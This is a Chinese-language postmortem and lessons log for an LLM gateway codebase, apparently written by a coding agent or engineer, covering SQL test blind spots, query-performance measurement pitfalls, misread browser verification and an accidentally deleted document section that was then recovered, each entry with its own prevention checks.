  `bg/node_probe.go` / `bg/probe_policy.go` 里 410/EOL 零引用。
- 防复发检查：
  (a) 看到"某节点不再被尝试"时，先读 `next_retry_at - now()`：
      **采样间隔必须 ≥ 重试周期**，否则"没恢复"这个观察不成立；
  (b) 排查失败分类时，**先确认错误码有没有真的参与决策**——
      找"用了 error/code/status 的那处分支"，而不是只看它被存进了哪个字段；
  (c) 同一仓库里对同一外部信号存在**两条路径**（凭据级 vs 节点级）时，
      把两条的判据并排读一遍；并排一读就能看出分歧，
      单独读任何一条都只会看到"它工作正常"；
  (d) 记录 `last_err_detail` 的**原文**再归因。`http_410` 与 `http_500`
      在码表上都是"失败"，原文里一个写着 end of life、一个写着内部错误，
      处置完全相反。
- 证据：`node_probe_state` cred=2 八行逐行 `last_err_code`/`last_err_detail`
  （4×410 end of life、`glm-5.3-flash`=429、`glm-5.3`=timeout、
  `codestral`=404、`ai-synthetic-video-detector`=500）；
  `bg/probe_backoff.go` 的 `NextDelay(failures int)` 签名只吃失败次数。
- 状态：取证已落地（验证记录 §8.1）；探针策略是否按错误类别分流待 owner 拍板

## 2026-10-17 — 观测工具用错顺序会造出"假缺陷"：先等渲染，再限制体积，再省操作数（Seen: 1/3）

- 任务 / 缺陷：对本地网关做逐页浏览器验证。连续三轮都判成
  「渲染侧无法取证 / 白页 / 观测通道损坏」，并据此把该项标为环境阻塞。
- 真实情况：**页面全部正常**。三个"环境故障"全是我自己的操作序列问题：
  1. `inspect` 不带 `limit` → 结果超 64 KiB 预算（`BROWSER_RESULT_TOO_LARGE`）。
     这是一个**快速失败**，不是超时；带 `limit` 后 `/dashboard` 23ms 成功。
  2. 同一标签**只有头几次操作可用**，之后逐次劣化到 275s 超时。
  3. **`open_tab` 后立刻读，会读到 Vue 尚未挂载的空 `main`（`totalLength: 0`）**——
     我据此把 `/admin/turns` 判成白页；加 `wait(3s)` 后该页完整渲染。
     **观测早于渲染 == 假缺陷。**
- 稳定配方（三步，缺一不可）：
  `open_tab(url)` → `wait(timeout=3000)` → `query(kind=text, selector=body, maxChars=小)`。
  逐页验证必须**每页一个新标签**。
- 防复发检查：
  (a) 工具报 `BROWSER_RESULT_TOO_LARGE` / 超时，**先怀疑自己的请求形状**
      （带 limit 了吗？选窄了吗？），而不是先判"环境坏了"——
      快速失败与超时是两种完全不同的信号，前者说明它**已经采到了东西**；
  (b) 断言"页面空白/渲染失败"之前，**必须先等待并至少复核两次**
      （不同标签 + 不同选择器）。本轮三次误判全部源于"只读了一次就下结论"；
  (c) 长时间连续失败时，换**操作序列**而不是只换页面——
      同一批 481 端点的服务端扫描是绿的、页面也是绿的，只有我这条路径在失败；
  (d) 渲染侧定不下来时，**退回既定口径**（以网关访问日志 + 直测 API 定案），
      并如实标注"渲染未取证"，不要把推断写成结论。
- 证据：`/admin/data-lifecycle` 渲染出完整 Top 20 表与存储读数；
  `/admin/turns` 渲染出四维筛选与时间范围；`/dashboard` `inspect` 23ms / 65 元素；
  `/request-logs` 的 `/api/logs` 直测 200/70ms/11036B，并用其首条
  `request_id` 完成退役闭环（`session_turns_hot`=1、`_request_logs*`=0、
  `request_logs` 已不存在）。
- 状态：已落地（验证记录 §8.0）

## 2026-10-18 — 真库判据里**抄**一份 SQL，判的是抄件不是被测物（Seen: 1/3）

- 任务 / 缺陷：修 `/api/providers/{id}` 详情页 500。为它写了「真库判据」——
  用 `TEST_DATABASE_URL` 连生产库、带 handler 同款 5s deadline 跑真实 SQL。
  **第一轮部署后接口仍然 500，判据全绿。**
- 真实情况：真库判据里那条 SQL 是我**手抄**在测试文件里的。事故当刻
  providers.go 里的 SQL 已经和抄件不是一回事（两行注释被误写成 Go 的 `//`，
  在 raw string 里成了 SQL 正文，线上 `syntax error at or near "同属"`），
  而判据跑的是抄件——**抄件当然还是对的**。生产跑的是 providers.go 里那份。
- 为什么连源码不变量也没挡住：三条都在断言「视图名 / 关联条件」，
  `//` 行里不含这些，于是全部放行。
- 防复发检查：
  (a) **凡是真库判据，被执行的 SQL 必须逐字取自被测源码**（本轮改成
      `getProviderSQLLiteral()` 从 `providers.go` 抠字面量），不得抄写；
      抄件与被测物会在第一次改动时分叉，而判据永远不会知道；
  (b) 真库判据的价值全在「跑的就是线上那份」。一旦改成抄件，它就退化成
      一个「我自己写的 SQL 能跑」的测试——这个命题几乎恒真；
  (c) 写完判据问一句：**如果线上跑的是源码里的另一份，我会红吗？**
      本轮答案是「不会」，这就是盲区本身。
- 证据：`db89dccb2` 上线 → `/api/providers/{id}` 仍 500（syntax error）、
  全部判据 PASS；改判据后 `//` 泄漏形态下 `HasNoGoComments` 与真库门**同时**变红。
- 溯源：提交 `f7de9944`；`admin/providers_get_error_rate_test.go`。

## 2026-10-18 — Go raw string 里的 SQL 注释必须用 `--`；`//` 是编译器看不见的语法错（Seen: 1/3）

- 任务 / 缺陷：同上一条。`getProvider` 把 SQL 写在反引号 raw string 里，
  我把两行注释写成了 Go 的 `//`。
- 真实情况：raw string 里 `//` 只是字符，不是注释。Go 编译器**不报错**（字符串内容
  完全合法），`go vet` 不报错，单测全绿，构建通过——**一路带到生产才由数据库报错**。
  SQL 的注释体系只有 `--`（和 `/* */`），与外层语言的注释语法是两套东西。
- 防复发检查：
  (a) 在 raw string 里写 SQL，注释**一律 `--`**；写完扫一眼该字面量里有没有 `//`；
  (b) SQL 字面量必须有判据把这条钉住（本轮新增
      `TestGetProviderSQLLiteralHasNoGoComments`：以 `//` 开头的行即失败），
      否则下一次「顺手改成 Go 注释」会原样复发；
  (c) 凡是把大段 SQL 放进 Go 字符串的改动，**必须有真库门**执行那一份字面量——
      这是唯一能在提交前发现语法错的门（本轮就是靠它当场变红）。
- 关联：与「源码文本判据要先剥注释再断言」互为镜像——本轮判据同时栽在这两处：
  一处**匹配到注释**（视图名断言对注释报错），一处**漏掉注释**（`//` 泄漏）。
  ⇒ 文本判据面对注释时，两个方向都要判：**别把注释当代码**（假红），
  也**别把代码当注释**（假绿）。
- 证据：154 日志 `getProvider query failed id=14 error="syntax error at or near \"同属\" (SQLSTATE 42601)"`。
- 溯源：提交 `f7de9944`。

## 2026-10-18 — 「计划变好了」不等于「查询能完成」：优化前必须验证完成性（Seen: 1/3）

- 任务 / 缺陷：修供应商详情页 500。顺带追查同库另一族慢接口时，发现一条后台
  gauge 查询在 154 上**5.5 小时内失败 20 次、成功 0 次**。
- 根因：R31（2026-10-10）审计已经识别过这条查询「30s statement_timeout
  ~3/h 必杀」，并用 849 覆盖部分索引 + `SET LOCAL` 提预算做了一次"修复"，
  注释断言 *make the same SQL completable*。**该断言从未被验证。**
  本轮实测：同样的 SQL 60s 超时、另一次 120s 超时；而 ANALYZE 掉那个
  2.7GB / 798k 行、统计从未采集的分区（耗时 13 分 37 秒）之后，
  **仍然超时**——真值是 330,544 行 NULL，哈希连接本身就不可承受。
  ⇒ 索引与计划优化解决的是「怎么算」，解决不了「要算多少」。
- 防复发检查：
  (a) 任何以「让这条查询可完成」为目标的改动，判据必须是**它真的跑完**，
      不是 `EXPLAIN` 变便宜、不是计划换了节点、不是索引被用上了；
      实测口径 = 真库 + 与线上相同的 statement_timeout 预算；
  (b) 改判据/改索引后要**看它到底跑没跑成**。本例中 worker 日志里
      「成功行」计数为 0 这个事实，早就能否证 R31 的结论——而它一直躺在
      日志里没人对账（这与 LESSONS 里「判据红了先怀疑前提」互为镜像：
      这里是一直红、没人看）；
  (c) 「证明无事」的空扫要单独估代价：一条永远超时、永不产出、却每 3 分钟
      烧满预算的查询，比一条诚实返回 0 的查询贵得多，而且零信息。
- 证据：154 `gateway-canary-8782.log`：starting=2 / stopped=1 /
  remaining count failed=20 / 成功=0（末次 06:30）；
  252 实测 A 无窗 60s 超时 vs B 7 天窗 7s 返回 0。
- 溯源：`docs/audit/2026-10-18-providers-detail-500-两轮部署复验.md` §10。
  本轮**未直接改**——它是发布闸门指标的口径变更，留给 owner 拍板。

## 2026-10-18 — 「共因」是可证伪的，写下它的预测，别只写下结论（Seen: 1/3）

- 任务 / 缺陷：查 15 个超时端点时，发现后台 backfill gauge 也每 3 分钟烧满
  一次预算、且 5.5 小时失败 20 次成功 0 次。我写下「第二族慢接口的**共因**是
  gauge 空转到超时」，并在 §八 标题里写「同源」。
- 真实情况：修好 gauge 并上线后串行复测，**8 个里 6 个耗时纹丝不动**
  （10.07s / 15.07s / 15.06s / 12.06s / 15.15s / 15.06s），只有 2 个从 500
  变 200。共因判断被自己的验证推翻——每个端点有自己的慢查询，各自打满自己的
  ctx。gauge 是**独立的**真缺陷，不是这一族的因。
- 错在哪：把「两件事都慢、都在同一个库上」当成「同一个原因」。那是相关不是
  因果。真正的推理链缺了一步：**说出可证伪的预测**。
- 防复发检查：
  (a) 凡是要写「共因 / 同源 / 都是因为 X」，紧接着必须写一句**若 X 被修好，
      这些现象应当怎样**。写不出这句，说明还没找到因果，只找到了相关；
  (b) 提出共因假设时，先确认它**便宜可测**。本例的预测只需一次上线 + 一轮
      串行复测（几分钟），却因为没写下来而白付了一整轮部署；
  (c) 反过来也要防止**过度归因**：修好 A 之后 B 变好了一部分（此处 2/8 改善）
      很容易被当成「方向对了」，但 6/8 没动才是主要事实。两个数字要一起报。
- 证据：`docs/audit/2026-10-18-providers-detail-500-两轮部署复验.md` §12 的
  修复前后对照表。gauge 修复本身仍然成立（21.7s→666ms、20 失败→0），
  被推翻的只是「它解释了第二族」这一句。

## 2026-10-18 — 计数类指标遇到「双腿读面」纪律：先问错误方向，别先满足纪律（Seen: 1/3）

- 任务 / 缺陷：修 `/api/admin/usage/cache-economics` 的 500（§13.9）。
  该端点的压缩请求计数读 canonical 视图，30 天窗口 **>300s 跑不完**，
  3s 子预算 100% 超时 ⇒ 端点把 `compressed_requests` 报成 **0**。
- 真实情况：`sqlreadguard` 的读面纪律要求 `_request_logs` 读 **hot∪母表双腿**
  （最近 8h 的行只在 hot，裸母表读有 ≤8h 盲区）。但 promote 会把旧行从 hot
  搬到母表，**朴素 UNION ALL 双腿会把同一行数两次**——而本仓
  `bg/routing_health_checks.go` 的 R47 债条目明写：正确的双腿必须走族视图
  并核对 promote 去重语义，那需要真实 promote 环境。
  ⇒ 纪律要求的「补齐双腿」正好是这里**更糟**的那个动作。
- 防复发检查：
  (a) 遇到「纪律要求补腿」时，先问**补错方向会怎样**：
      计数类指标里，「低估一小段」通常是保守且可解释的，
      「重复计数」是系统性虚高且方向随 promote 时机漂移。
      两者不对等时，**不要为了满足纪律而制造更严重的错误**——
      把取舍写进注释并按格式登记白名单（本仓先例：
      `internal/summarystore/store.go`、`session_request_status_backfill.go`）。
  (b) 看到「指标恒为 0 / 恒为空」先查它是不是**超时降级的产物**。
      本例 0 长得和真值一模一样，只有 journalctl 里的
      `... unavailable / timeout` 才暴露真相。
      ⇒ 断言「某计数 > 0」时，必须有一条**独立于该计数器自身**的路径
        能让它非零；本例的判据因此加了真库层（3s 预算内必须跑完 +
        与独立重算一致），而不是只断言源码里有那条 SQL。
  (c) 「指标从未返回过真值」这件事本身要**如实记录**：改对之后
      数字会从 0 跳到 10,590，这不是回归，是第一次给真值。
      不写清楚，下一个人会以为新数字有问题。
- 证据：`docs/audit/2026-10-18-providers-detail-500-两轮部署复验.md` §13.9；
  实测 `_request_logs` 648ms/10,590 行 vs 视图 >300s；判据变异 4/4 精确变红。
- 溯源：`787b7367a`。

## 晋级记录

将已晋级条目移到这里，并链接目标规则、清单或技能。同一模式只按不同工作日计 `Seen`；出现三天后晋级。经证据确认的安全、隐私、数据丢失或生产事故，若已有可执行的防复发检查，可立即晋级。

## 2026-10-17 — r1035：Bash/exec 上 custom 地址规则误拦

- **根因**：`pii.address.egress`（type=custom, kind=pattern）挂在 ScopeEgress；中文路径含「路/号」命中后整条 tool lane `output_policy_blocked`。地址分类 ≠ 外传目的地。
- **防复发**：本地执行工具（Bash/exec_command…）与惰性内容工具上，跳过非 `network_destination` 的 custom；判据 `r1035_local_exec_address_not_egress_test.go`；E2E 必须确认 tool_calls 在场（否则假绿）。
- **证据**：154 client `59d936b8…` / gw `913cf85b…`；部署后 `pii.address.egress` block=0；minimax-m3 Bash+中文路径 200+tool_calls。
- **溯源**：未提交工作区 + 154 `2698-a4e2480e`；强制 OutputSensitive 不受 `output_compliance.enabled` 影响——关可选模块挡不住这类误拦。

## 2026-10-18 — 剥掉 `--` 注释还不够：`DO` 块里的字符串字面量与无界子串切片同样让 `Contains` 失去判别力（Seen: 1/3）

- 任务 / 缺陷：修 `/api/admin/usage/cache-economics` 的 500（迁移 873，
  给 `usage_ledger` 的覆盖索引补上 `cache_read_tokens`）。为这条迁移写了
  9 条源码不变量判据。**首轮变异验证 9/9「全红」，但其中 3 条是假红。**
- 真实情况：同一个陷阱连踩了三次，每次剥掉一层，下一层又让它失效。
  (1) 迁移注释里反复出现 `cache_read_tokens`，`strings.Contains` 恒真
      ⇒ 已加 `--` 剥离；
  (2) 剥掉 `--` 后，两个**旧索引名**在 `DO $comment_873_index$` 块里又以
      **字符串字面量**（`COMMENT ON INDEX` 的正文）出现一次
      ⇒ `Contains(code, "…cover_agg_idx")` 依然恒真，删掉真正的
      `DROP INDEX` 语句判据照样绿。改成**语句级**匹配（切分 `;` 后逐句取）；
  (3) 守卫块用 `guard := code[guardStart:]` 取 —— 这是**无上界**切片，一路
      吃到文件末尾，把后面 `$comment_873_index$` 块里的同名 `to_regclass`
      一起吞进来，于是「守卫块判没判这个索引」也恒真。给切片加上界。
- 为什么危险：假红最容易被读成「判据很强」。我当时看到 9/9 全红就准备收工，
  是因为**同一次变异里 `TestRegistryShaIsActuallyTheFile` 也红了**——
  那是 SHA 门替我背的书。把每条变异**单独**跑它对应的判据（`-run '^X$'`）
  之后，4 条立刻现形。
- 防复发检查：
  (a) 判据若靠「某个标识符**不出现/出现**」来定位，剥掉注释之后还要问
      **它会不会以字符串字面量的形式出现在 DO 块 / COMMIT 正文 / 注释块里**；
  (b) 取子串必须有**两端界定**。`code[start:]` 是「取到文件末尾」，
      不是「取到那个块结束」；
  (c) 变异验证**一次只跑一条目标判据**。多条一起跑时，别的那道门
      （这里恰好是 SHA 门）会因为无关理由变红，让假红冒充真红；
  (d) 断言「出现次数 ≥ N」而不是「出现过就算」，否则删掉 N−1 条照样绿。
- 证据：`internal/sqlguard/usage_ledger_cache_agg_idx_test.go`；首轮 9/9 假红，
  单独复跑后 4 条现形，重写后 **13/13 目标判据精确变红**
  （`/tmp/mut3.py`，还原校验 True）。
- 溯源：工作区未提交。

## 2026-10-18 — 写进代码注释的实测数字必须能自证「窗口」和「计时边界」（Seen: 1/3）

- 任务 / 缺陷：cache-economics 第一版修复（`1928c544` / 上线 `2699`）无效。
  那一版的注释写着「252 实测：主聚合 6020 ms / compressedQuery 35344 ms」。
- 真实情况：**那两个数字都不是那条查询的耗时。**
  (1) 窗口错了：端点走 `resolveUsageTimeRange(r, 30)`，默认是**最近 30 天**；
      当时的计时取自「今天（6,668 行）」和「本月（438,544 行）」。
      行数差 65 倍而耗时几乎相同（8294 / 12397 ms），我据此写下
      「疑似未按 ts 剪枝」——而真实窗口下它**剪枝完全正常**。
  (2) 计时边界错了：同一次 `EXPLAIN` 在当天窗口下 `Execution Time`
      只有 **61.367 ms**、`Subplans Removed: 3`。8.3s 来自包着
      `podman exec` 的 wall clock，混进了进程启动开销。
- 防复发检查：
  (a) 注释里的实测数字，必须能让三个月后的读者**重建**它：SQL、窗口、
      冷热、计时边界（是 `Execution Time` 还是 wall clock）四样都要写全；
  (b) 窗口错了比数字错了更难发现——数字错了看一遍就疑，窗口错了
      **数字彼此自洽**（65 倍行数、相同耗时，正是「不剪枝」的样子），
      会把我引向一个完全不同的根因；
  (c) 判「慢」时先确认**窗口与被测函数一致**：`resolveUsageTimeRange(r, 30)`
      这种默认值要抄下来，别凭「本月」猜；
  (d) 注释里的实测数字如果参与了决策，就是**代码的一部分**。
      错了要改注释（本轮 §13.1），不能让错误继续指导下一个人。
- 证据：`docs/audit/2026-10-18-providers-detail-500-两轮部署复验.md` §13.1–13.2；
  真实窗口实测 12.667 s / 1,478,131 行，`Subplans Removed` 正常。

## 2026-10-18 — 负载会变时用「同轮交错对照」，不要用前后两次测（Seen: 1/3）

- 任务 / 缺陷：给 cache-economics 的 30 天聚合定位根因。宿主 252 的
  load average 在 33–44 之间（4 核，被别的会话遗留的递归 grep 吃满），
  同一台机器上同一条查询的耗时在 **61 ms 到 14 s** 之间摆动。
- 真实情况：先后两次测会得到**互相矛盾的计划结论**——先测到
  `Parallel Index Scan`（回堆），再测 `Parallel Index Only Scan`（不回堆），
  差点得出「缓存索引本来就在生效，是我在看错」。
  改成 **A/B/A/B 交错**之后，计划形态 **4/4 稳定**，
  根因才浮出来：856 的 `INCLUDE` 缺 `cache_read_tokens`。
- 防复发检查：
  (a) 计划形态要单独当判据断言（`Index Only Scan` / `Index Scan` / `Seq Scan`），
      它比耗时稳定得多；**buffer 计数是确定量，耗时绝对值不是**；
  (b) 需要对比两段代码/两个索引时，**同轮交错 A/B/A/B**，不要「改之前测一次、
      改之后测一次」；
  (c) 报结论时把两者分开写：结构性的（计划形态、buffer 数）当证据，
      绝对耗时标注它是在什么负载下测的。
- 证据：§13.2 的 A/B/A/B 表（209,361 vs 19,245 buffers，4/4 计划稳定）；
  §13.4 的 `ROLLBACK` 试跑（20,981 buffers，但 Execution 14.1 s——
  新索引冷 + load 44，**不能读成「索引更慢」**）。

## 2026-10-18 — 「一组慢端点」不是一族：清掉外部干扰源后必须重新分类（Seen: 1/3）

- 任务 / 缺陷：§12 把 8 个慢端点归为「第二族」，并打算逐条治理。
- 真实情况：清掉宿主上三个失控递归 grep（load 44 → 19）后串行复测，
  **8 个里 4 个自愈**：`users/usage-summary` 15s → **200@1.36s**、
  `dashboard/session-trend` 15s → **1.36s**、`dashboard/session-health` 15s → **2.22s**、
  `data-lifecycle/storage/tables` 15–30s → **200@10.05s**。
  另外 4 个纹丝不动：`session-analytics` / `turns-sessions-filter-options` /
  `data-lifecycle/stats` 仍超时，`auto-route/index` 是 1.78s 快速失败（不是超时）。
- 为什么这个区分是决定性的：「CPU 饥饿」会自愈，「查询/处理逻辑缺陷」不会。
  拿前者当后者的修复目标＝白付一次部署 + 一轮复测（本会话已经这么付过一次，
  见「共因是可证伪的」那条）。
- 防复发检查：
  (a) 给一批现象归类之前，先把**外部干扰源**列一遍并确认它们的状态
      （宿主负载、同库上的其他会话、并发探针自身）。干扰源在位时，
      「一族」这个判断几乎没有信息量。
  (b) **同时测两遍、且要等干扰源变化后再测一遍**。只有前后对照才能把
      「自愈的」和「不动的」分开，单次快照做不到。
  (c) 响应**快速失败**（远小于预算就 500）与**超时**是两类问题，
      归类时别混。前者不是慢查询。
- 证据：`docs/audit/2026-10-18-providers-detail-500-两轮部署复验.md` §14 的对照表。

## 2026-10-18 — 「合并成一条查询」不是普适优化，必须逐臂实测（Seen: 1/3）

- 任务 / 缺陷：`turns/sessions/filter-options` 用 8 条**串行**查询填一个 12s 预算，
  逐条实测需要 ~40s ⇒ 预算结构上不可能成立。看上去的修法是把 8 条合并成 2 条
  GROUPING SETS。
- 真实情况：**合并对两条臂效果相反**（同一窗口实测）：

  ```
  session_turns 三维合并      2.84s   ← 比单跑一条（3.83s）还快
  session_summaries 三维合并 35.45s   ← 比三条分跑的总和（15.8s）还慢一倍多
  ```

  summaries 臂每条查询各自带 `IS NOT NULL AND != ''` 谓词、只哈希自己那一列；
  合并后必须在 join 之后对所有列组合做一次多列分组，代价反而更高。
- 防复发检查：
  (a) 「N 条相似查询 → 1 条 GROUPING SETS」是**假设**，不是结论。
      每条臂的谓词选择性、索引可用性、列宽都不同，收益可以反号；
  (b) 动手前先把两条臂都量一遍（各维度单独计时 + 合并版计时），
      成本是几分钟，省掉的是一次必然要回滚的改造；
  (c) 同一批「看起来等价」的查询，**合并收益必须逐条报**，
      不能只报合并后的总数。
- 证据：审计 §14.2 的对照表。

## 2026-10-18 — 「同型缺陷 ⇒ 同型修法」和「缺 join 索引 ⇒ 加 join 索引」都要实测（Seen: 1/3）

- 任务 / 缺陷：修 `/api/admin/turns/sessions/filter-options`（500 @12s）。
  它用 8 条**串行**查询填一个 12s 预算，逐条实测需 ~40s。
- 真实情况：动手前测了三个「显然的修法」，**三个全不成立**。
  (1) **同型修法**：`session_turns` 的 EXPLAIN 走 Index Scan 且维度列不在索引里，
      看着和刚修好的 cache-economics（873）一模一样 ⇒ 建
      `(ts, tenant_id) INCLUDE (model, provider, status_code)`。
      实测：索引 5s 建好、确实级联（9月 48MB），但**计划一字未变**，
      buffers 只从 215,013 降到 181,891（−15%，不是 10×）。
      ⇒ 长得像的病不一定同治；planner 不选新索引时，加索引只是白付一次生产建索引。
  (2) **缺 join 索引**：9 条里有 5 条 join `session_dim(gw_session_id, tenant_id)`，
      而它的 7 个索引没有一个建在这个键上 ⇒ 加一条。
      实测：**反而更慢**。原因是那条索引 200,008 buffer，而 `session_dim`
      全表只有 23,272 buffer——**索引比表还宽**，对全量 hash join 是净亏。
  (3) **并行化**：`session_overview.go` 有同型先例（"墙钟 = max(段)"）。
      实测：串行 121.8s → 并发 22.8s，是 **5.3× 不是 9×**——
      这些查询争的是 CPU 与 buffer 不是 I/O，收益≈核数，仍装不进 12s。
- 防复发检查：
  (a) 「A 刚修好，B 长得一样，所以照抄 A 的修法」是**假设**。先花一次
      事务内 `ROLLBACK` 试跑（870 起的手法，成本几分钟）验证 planner 真的会选它；
  (b) 加索引前先量**表本身要多少 buffer**。索引比表宽时，
      planner 用顺序扫是对的，加索引只会更贵；
  (c) 并行收益要**实测而不是套用先例**。先例里的「墙钟=max(段)」成立，
      是因为那些段有空闲核；CPU/缓冲密集型段并发时自身会变慢。
  (d) 三个修法全否时，**正确产出是记录否证**，不是继续猜下一个。
      审计 §14.6 就是这样收的：写清「要降的是 ss 臂单条成本」，
      而不是硬上一个注定不够的改动。
- 证据：审计 §14.6 的三组对照数据（含自测错误：41.9s 是我自己并发造成的争抢，
  清空后复测 3.83s；同一查询本次会话出现 2.08/3.83/6.23/78.7 四个值）。

## 2026-10-18 filter-options 第五轮：判据的**参数**也必须同层

### 判据自造参数 = 测了一条生产不可达的分支（100% 必现的缺陷判据全绿）

- 现象：`turnTenantClause` 拼出 `" AND AND tenant_id = $1"`，PG 报 42601，
  turns 臂三个下拉**恒空**，端点却一直返 200（错误被降级路径吞掉）。
  上一轮的真库判据**全绿**，线上连续 7 次命中。
- 根因不是判据写得不够细，是**判据自己编了一个参数**：
  上一轮真库层调的是 `h.turnMergedSource("")`。
  而生产上 tenantID **永远非空**——`GetTenantID(r)` 取不到租户时兜底返回
  `"default"`（`admin/context.go:37`），admin 用户走
  `tenantFromQueryOrContext` 时没有 `?tenant=` / `X-Tenant-ID`，
  最后落回 `GetTenantID` ⇒ `tenantID = "default"`。
  ⇒ `tenantWhere == ""` 那条分支是**死代码**，判据测的正是它。
- 根因：判据与被测函数**同层**不等于同参数。已有的纪律只说了「判据必须调
  生产函数本身」，没说「必须用生产会传的参数」。函数对了、参数是编的，
  照样测不到线上那条路。
- 防复发检查：
  (a) 判据里凡是出现**常量参数**，先问一句：这个值生产上会出现吗？
      能从上游解析函数拿到的，就别写死——哪怕写死也要在注释里注明
      「生产实际值是 X」。
  (b) 优先让判据**端到端驱动 handler**（`httptest.NewRequest` + `httptest.ResponseRecorder`），
      让租户/鉴权解析走生产路径，而不是直接调内部构造函数。
      本轮 `TestFilterOptionsHandlerEndToEndWithRealTenant` 就是这么写的：
      不注入 auth context ⇒ 走的就是线上 admin 的 `"default"` 兜底，
      变异下逐字复现了线上症状（42601 + 三格空 + 仍返 200）。
  (c) 默认值型函数要特别警惕：`GetTenantID` 返回 `"default"` 而不是 `""`，
      「兜底成非空值」会把「没有」悄悄变成「有一个」。
      读这类函数时要先确认它到底会不会返回空串。

### 「常量名出现过」这种判据是**真假绿**（自己写出来的，当场抓到）

- `TestFilterOptionsNeverReturns500` 原本检查「三条臂的预算常量名是否出现在
  handleTurnsFilterOptions 函数体里」，用来钉「三条臂都有界」。
  变异把 ss 臂改成 `context.WithCancel(ctx)`（同样无界）后——
  **照样全绿**，因为 `slog.Warn(..., "budget", turnsFilterOptionsSsBudget, ...)`
  还在引用那个常量。
- 教训：断言必须匹配**机制**而不是副作用。改成正则
  `context\.WithTimeout\(ctx,\s*turnsFilterOptionsSsBudget\)` 后变异立刻变红。
  ⇒ 「这行代码里出现过 X」几乎总是可以被「在日志里又提了一次 X」绕过；
  要钉住行为，就钉产生行为的那段结构。

### 降级判据缺正向下限 = 「什么都没返回」与「正常返回」等价

- 真库层判据原本把 turns 臂的行数只 `t.Logf` 出来就收工，
  于是「查得飞快但一个值都没返回」和「正常返回 47 个值」在判据眼里完全一样。
  线上恰恰是后者这种情况被降级成前者，端点还返 200。
- 这与几何判据的教训同源：**只断言「没坏」的判据，在「干脆没做」面前永远是绿的**。
- ⇒ 凡是「某个列表应该有内容」的判据，都要有一条**正向下限**断言。
  本轮补上后，`terr == nil 但 turnRows == 0` 会红；
  变异（重新植入 42601）当场抓出三个下拉全空。

### 性能：wall clock 会骗人，buffers 不会（本轮第三次被同一件事教育）

- 给 `session_summaries` 加覆盖索引让 planner 走 Index Only Scan：
  wall clock **3,432ms → 2,490ms（看着赢了 27%）**，
  buffers **69,912 → 168,993（输了 2.4 倍）**，Heap Fetches 172,001。
  ⇒ 热缓存下 IO 量翻三倍仍可能更快，但**冷缓存下必然更差**——
  而这个端点的故障恰恰是冷缓存造成的。墙钟变快是假象。
- 反向的一次：`session_turns` 加 `(tenant_id, ts DESC) INCLUDE (model, provider, status_code)`
  覆盖索引，buffers 159,153 → 127,888（**只 −20%**）。原因是九月分区
  （483,570 行）仍被 planner 选去用既有的 `session_turns_2026_09_heap_tenant_id_ts_idx`，
  单独就占 118,030 buffers（占总量 84%）。⇒ **要拿到收益得让 planner 改选，
  那已经不是「加个索引」能定的事**。
- 还有一条**比索引便宜 200 倍但不能做**的路：`session_dim.last_active_at`
  的现成索引给 371 buffers / 0.7ms（现形态 69,912 buffers / 1.5~2.1s）。
  但它换掉了排序口径，且实测**不收敛**：N 取到 60,000 时仍缺 20 个、多 13 个值。
  ⇒ 「快 200 倍」和「是不是同一个下拉」是两个问题，后者要 owner 裁定。
- ⇒ 报告索引类结论时，**同时给 buffers 和 wall clock**，并说明冷缓存下的方向；
  只报 wall clock 会把 2.4 倍 IO 增量的改动说成优化。

### `count(*)` 包在子查询外面会改变被测查询的工作量

- 用 `SELECT count(*) FROM (<真实查询>) z` 测「加租户过滤有没有变慢」，
  得到 1.68s / 1.70s，于是判为「租户过滤无害、子预算够」。
  换成真正把 961 行取出来跑，同一条查询是 **6.3s（首读）/ 1.54s（次读）**。
  ⇒ `count(*)` 让 PG 有余地裁掉外层不需要的投影，量到的不是生产那条查询。
  ⇒ 量查询成本要**照原样取行**，别用 `count(*)` 包一层图省事。

## 2026-10-19 §105 轮：三次量具事故 + 一次**误删 2,948 行已提交内容**

### ⭐⭐⭐⭐⭐ `str.index(锚点)` 在两万行文档上是**全文件搜索**，不是"这一段里的查找"

改 runbook 时我用 `s.index('> 原文保留不改。')` 当横幅的结束锚点，
**心里假定它就在横幅末尾**。实际该字符串在文件里出现 4 次（§98/§99/§102 各一处），
`index()` 命中的是 3,144 行之外那处，于是

```python
s = s[:start] + banner + s[end:]     # start=22178, end=25322
```

把 **22178~25322 整段替换掉了 = 删掉 2,948 行已提交内容**（含 §102/§103/§104 全部正文）。
`git diff --stat` 立刻显示 `3143 deletions(-)`。

- ⇒ ⇒ ★ 通用式：**在长文档上做任何"起止锚点"替换前，先断言锚点唯一**：
  ```python
  assert s.count(ANCHOR) == 1, f"锚点不唯一: {s.count(ANCHOR)}"
  ```
  或改用有界搜索（限定在 `^## ` 小节切片内 `find`）。
- ⇒ ⇒ ★ **`git diff --stat` 是这一类事故的唯一可靠探测器**，而且它 0 成本。
  本轮如果先跑一次再写下一段，就能当场看见 `deletions(-)`。
  ⇒ 纪律升级：**大文件编辑，每写一段就跑一次 `git diff --stat`，确认只有 `insertions(+)`。**
- ⇒ 恢复方式：`git checkout HEAD -- <file>`（HEAD 未被改动 ⇒ 干净），
  再用有界锚点重做。**这也是为什么不该 `git commit --amend` 未推送的错误**——
  HEAD 保持可回退，事故成本就从"永久丢失"降到"重做一遍"。

### ⭐⭐⭐⭐ 统计表里的「合计」必须由明细算出来，不能手写

第一版 §105 的表同时写着「16 个样本」「失败 9 次（56%）」「成功 8 次」——
**9+8=17≠16**，三个数字两两不自洽，而我盯着这张表下了一整节结论。
⇒ 「合计」这类数字**永远从明细行 `sum()` 出来**，手写的合计只配做交叉校验。

### ⭐⭐⭐⭐ 「没做去重就先报统计」造出了一个不存在的运维事实

日志里 601 条 `start` 其实是 **377 轮**——10-05~10-10 整轮输出被打印 2~3 遍。
不去重我就会报出「每日 72 轮 / 每 20 分钟一次」，而实际全程每小时一轮。
⇒ ⇒ **任何以"条数"为分母的比率，先问「这个条数是不是事件数」**；
日志类数据源要按**事件键**（这里用 start 时间戳）去重后再统计。

### ⭐⭐⭐⭐ 两次解析器量具事故，都是"过滤器把失败样本滤掉了"

1. `med`（基线中位数）只在**成功**轮打印，我按 `r['med']` 过滤 ⇒
   **所有 ABORT 被筛掉**，"regime B" 实为 79 条纯成功样本。
2. `----- 异常桶明细 -----` 那行**没有 `[时间戳]` 前缀**，被
   `^\[(\S+ \S+)\] (.*)` 整条滤掉 ⇒ `grep` 数到 217，解析器只认领 154。
   两者差 63 对不上时，必须查到底——**对账不平就是量具有问题，不许四舍五入**。
- ⇒ ⇒ ★ 通用式：**筛掉"没有某字段"的行之前，先数一遍被筛掉多少**，
